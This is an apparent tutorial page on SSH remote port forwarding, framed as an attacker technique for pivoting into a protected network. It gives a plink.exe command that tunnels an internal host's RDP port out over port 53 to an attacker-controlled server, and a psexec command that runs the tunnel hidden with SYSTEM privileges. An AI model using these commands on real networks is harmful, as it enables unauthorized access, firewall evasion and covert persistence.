<title>Remote Port Forward</title>
</head><body><b>Remote port forwarding</b>: <br/>
This is the more cool feature , or what we`re going to actually use . Since it`s not usually possible to find a open ssh server on target network ( unless it`s lame target) normal forwarding would not be a possible scenario . Here`s where 'remote' port-forwarding comes handy . <br/>
In remote port-forwarding , the start point of tunnel will be on ssh-server , rather than own client , and the end of tunnel will be the host running ssh-client . In other words , In this scenario , host B runs the ssh-client and connect to a ssh-server outside of protected network . Then a port will be opened on ssh-server and anything sent to ssh-server on that port , will be forwarded to specified destination ( host C in our case ) .<br/>
Noticed the difference ? yes, this way attacker does not need to be able to ssh to any host in protected network . No ssh-server in protected network is even necessary . All we have to be able to execute inside protected network , is a ssh-client , plink.exe for example . Let`s try it :<br/>
<br/>
Assuming that<br/>
We have a ssh-server under our control , running on our own host {host-A} or any server in internet<br/>
ssh server is configured to allow 'remote port forwarding' . This is the case only for OpenSSH running on *nix .<br/>
We have prepared a account which is permitted for doing 'remote' port forwarding. Usually only high privileged users (root) have this .<br/>
At least one host ( host B ) in protected network , have at least one open port in ACL of firewall to be able to connect to servers outside of network . Wise admins usually block all outgoing connections , so 53 maybe your lucky number again .<br/>
SSH server is listening on same port as above . So if only 53/tcp is allowed for outgoing , our ssh-server should be listening on same port .<br/>
<br/>
We`ll run below command on host B :<br/>
plink.exe {host-A} -P 53 -C -R 127.0.0.1:444:{host-C}:3389 -l username -pw password<br/>
<br/>
If you want to connect to tunnel entry point ( port 444 ) on same host as ssh-server , you can again skip 127.0.0.1:444 and use '-R 444:{host-C}:3389' . <br/>
If ssh-server is running another host , say a zombie host , you should exactly specify IP address of interface you want to bind socket to . So if ssh-server is running on 1.2.3.4 , you should use '-R 1.2.3.4:444:{host-C}:3389' .<br/>
Another important note is that , by default ssh-server accepts connections to remote forwarded port ( 444 ) only from localhost ! So check configuration of your client/server on how to config that in correct way . In putty.exe this should be specified with a check mark as below . RTFM for how to do this on your favorite ssh client .<br/>

<br/>
With above option allowed , now you can remotely connect to ssh-server on port 444 and get redirected to internal network and host C on port 3390 . Without that option , it would be possible to connect to port 444 only from the same host as ssh-server .That`s it ! Welcome to internal network .<br/>
<br/>
To run the forwarder ( ssh client , plink.exe for example ) running in background , you can use PsEXEC to execute it hidden in background and with system privileges so it`s not killed by user :<br/>
<br/>
psexec.exe -s -d plink.exe &quot;plink parameters here&quot;<br/>
<br/>
<br/>
To forward a remote port to a local destination, just use the -R option instead of -L:<br/>
<br/>
putty -R 5023:mytelnetserver.myhouse.org:23 -load mysession<br/>
plink mysession -R 5023:mytelnetserver.myhouse.org:23<br/>
